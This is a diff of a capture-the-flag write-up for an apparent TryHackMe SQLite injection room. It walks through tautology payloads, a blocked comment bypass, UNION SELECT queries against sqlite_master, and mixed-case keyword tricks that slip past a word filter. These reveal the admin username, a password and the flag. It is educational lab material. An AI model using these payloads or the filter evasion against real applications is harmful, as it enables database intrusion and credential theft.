@@ -109,14 +109,32 @@ As suggested from the challenge name, this database is likely to be a SQLite dat
 **Possible SQL statements on the server side:**
 
 ```sql
-SELECT * FROM users WHERE name='smokey';
+SELECT * FROM users WHERE name=[input_name];
 ```
 
 **Attempts with common SQL injection inputs:**
 
-1. _**Force the statement to resolve to true**_
+### (1) Force the statement to resolve to TRUE
 
-_Potentially tricking the database to return all the users_
+_a) Potentially tricking the database to return all the users_
+
+_**1st attempt**_
+
+```sql
+' OR 1=1
+```
+
+_**Response:**_ `Error: unrecognized token: "' LIMIT 30"`
+
+From the error message, I understand that the query on the server side is as follows:
+
+```sql
+SELECT * FROM users WHERE name='[input_name]' LIMIT 30;
+```
+
+_**2nd attempt**_
+
+The `--` operator represents a single-line comment. This is used to tell SQL to ignore the comments after our input. In this case, it allows bypass of the `' LIMIT 30` command.
 
 ```sql
 ' OR 1=1 --
@@ -125,14 +143,14 @@ _Potentially tricking the database to return all the users_
 _Hope to resolve to the following in the server side_:
 
 ```sql
-SELECT * FROM users WHERE name='' OR 1=1--';
+SELECT * FROM users WHERE name='' OR 1=1--' LIMIT 30;
 ```
 
 **Reponse**: `For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)`
 
 This tells us that comment characters are banned.
 
-**Another attempt:**
+**3rd attempt:**
 
 ```sql
 ' OR ''='
@@ -148,66 +166,151 @@ This seems to return a password value (associated with the _**alice**_ username)
 
 
 
-2. _**UNION and SELECT statement**_
+### (2) UNION SELECT statement
 
-The UNION and SELECT keywords (along with their lower capital variations) are all banned too
+a) Query the `sqlite_master` database for more information
+
+What is `sqlite_master`?
+
+> Every SQLite database contains a single "schema table" that stores the schema for that database. The schema for a database is a description of all the other tables, etc. that are contained within the database.
+
+{% embed url="https://www.sqlite.org/schematab.html" %}
+
+_**1st attempt to query the `sqlite_master` schema table**_&#x20;
+
+* This can be used to discover the name of the other tables available in the SQLite database
 
 ```sql
-UNION
-SELECT
-union
-select
+' UNION SELECT name FROM sqlite_master WHERE type='table' OR '=
 ```
 
-**Reponse**: `Ahh there is a word in there I don't like :(`
+_**Response:**_ `Ahh there is a word in there I don't like :(`
 
-3. _**Obfuscation of keywords**_
+
+
+* The full lowercase form for the UNION and SELECT operator in the query returns the same response too
+
+```sql
+' union select name FROM sqlite_master WHERE type='table' OR '=
+```
+
+
+
+### (3) Obfuscation of keywords
 
 After pondering for awhile on the error message returned from the statement in point 2 above, I got the idea of using non-standard SQL keyword commands, apart from the conventional fully capitalized, or fully non-capitalized versions (`UNION`, `union`).
 
+_**Query 3.1**_
+
 ```sql
---**
-' Union Select name from sqlite_master where type = 'table' '=
---OUTPUT: Error: near "'='": syntax error
-
---**
-' Union Select name from sqlite_master where type = 'table' OR '=
---OUTPUT: Password: admintable
-
-
---**
-' Union Select * from admintable '=
---OUTPUT: Error: SELECTs to the left and right of UNION do not have the same number of result columns
-
---** to resolve the first half of the UNION to false (since anything with AND '1=0' will always be false)
-' AND '1=0' Union Select * from admintable '=
---OUTPUT: Error: SELECTs to the left and right of UNION do not have the same number of result columns
-
-
---** TRYING TO GET COLUMN NAMES OF THE TABLE 'admintable'
--- ** NOTICE the different cases of the letters, different from: UNION, union
-' Union Select sql FROM sqlite_master WHERE type = 'table' AND name = 'users' OR '=
---OUTPUT: 
-/*
-Password: CREATE TABLE admintable (
-                   id INTEGER PRIMARY KEY,
-                   username TEXT,
-                   password INTEGER)
-*/
-
---**
-' Union Select username from admintable '
---OUTPUT: Password: TryHackMeAdmin
-
---** NOTE: Union keyword has funny capitalization, but works nonetheless
-' UnIoN Select password from admintable '
---OUTPUT: Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
-
---**
-' UNion Select password from admintable where username='TryHackMeAdmin' or '=
---OUTPUT: Password: mamZtAuMlrsEy5bp6q17
-
+' Union Select name FROM sqlite_master WHERE type = 'table' OR '=
 ```
+
+_**Response 3.1:**_ `Password: admintable`
+
+* It appears that this method works
+* We have discovered that there exists a table with the name `admintable`
+
+
+
+_**Query 3.2**_
+
+```sql
+' Union Select * from admintable '=
+```
+
+_**Response 3.2:**_&#x20;
+
+`Error: SELECTs to the left and right of UNION do not have the same number of result columns`
+
+* This response tells us that the admintable table have more than one column
+* Thus, it causes a number of result columns mismatch from the original query (first part of the query before the `UNION` keyword)
+
+> Note that the original query only returns one column
+
+_**Query 3.3**_
+
+We need a method to view the exact schema of the table, before selecting a single column to read the value directly&#x20;
+
+```sql
+' Union Select sql FROM sqlite_master WHERE name='admintable' OR '=
+```
+
+_**Response**_ _**3.3**_:
+
+`Password: CREATE TABLE admintable (`\
+&#x20; `id INTEGER PRIMARY KEY,`\
+&#x20; `username TEXT,`\
+&#x20; `password INTEGER)`
+
+
+
+_**Query 3.4 (Answer to qn 1)**_
+
+Now, with the information retrieved from the previous response, I can select a column value to read. In this case, it will be the `username` column.
+
+```sql
+' Union Select username FROM admintable  '
+```
+
+_**Response**_ _**3.4**_:
+
+`Password: TryHackMeAdmin`
+
+To answer question 1 "_What is the admin username?_": `TryHackMeAdmin`
+
+
+
+_**Query 3.5 (Answer to qn 2)**_
+
+Now that we know the admin username, we can find the password with the following query:
+
+```sql
+' Union Select password FROM admintable WHERE username='TryHackMeAdmin' OR '=
+```
+
+_**Response**_ _**3.5**_:
+
+`Password: mamZtAuMlrsEy5bp6q17`
+
+To answer question 2 "_What is the password to the username mentioned in question 1?_": `mamZtAuMlrsEy5bp6q17`
+
+
+
+_**Query 3.6 (Answer to qn 3)**_
+
+<pre class="language-sql"><code class="lang-sql"><strong>' Union Select password FROM admintable '=
+</strong></code></pre>
+
+_**Response**_ _**3.6**_:
+
+`Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
+
+To answer question 3 "_What is the flag?_": `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
+
+
+
+### (4) Other queries to understand the concept of `sqlite_master` schema table
+
+_**Query 4.1**_
+
+```sql
+' UNion Select sql FROM sqlite_master where type='table' OR '=
+```
+
+* Returns the same response as query 3.3 above
+
+_**Query 4.2**_
+
+Returns the same response as query 3.1 above
+
+```sql
+' UNion Select tbl_name FROM sqlite_master where type='table' OR '=
+```
+
+
+
+### Conclusion
 
 From the results, I have learnt that SQLite accepts variations of SQL keywords, such as but not limited to: `Union`, `uNion`, `unIon`, `uniOn`, `UNion`, etc. are allowed, and are treated as valid commands.
 
